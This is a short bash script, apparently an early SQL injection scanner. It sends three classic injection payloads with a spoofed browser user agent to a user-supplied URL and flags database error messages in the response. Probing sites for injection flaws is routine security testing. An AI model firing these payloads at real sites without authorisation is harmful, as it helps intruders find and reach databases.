#! /bin/bash
# This is a work in progress
# This is not intended to be used maliciously 

# Set the URL of the site to be tested
echo "Enter the URL to test:"
read site_url

# Set the user agent string
user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"

# Set the list of payloads to be tested.
# I will update this to pull from a list of payloads
payloads=(
  "' OR 1=1--"
  "' OR '1'='1"
  "'; SELECT * FROM users--"
)

# Iterate through the payloads and test each one
for payload in "${payloads[@]}"; do
  # Send a request to the site with the payload
  response=$(curl -A "$user_agent" -s "$site_url?q=$payload")

  # Check if the payload was successful by looking for a specific string in the response
  if [[ $response == *"database error"* || $response == *"syntax error"* || $response == *"SQL syntax"* ]]; then
    echo "SQL injection vulnerability found with payload: $payload"
  fi
done
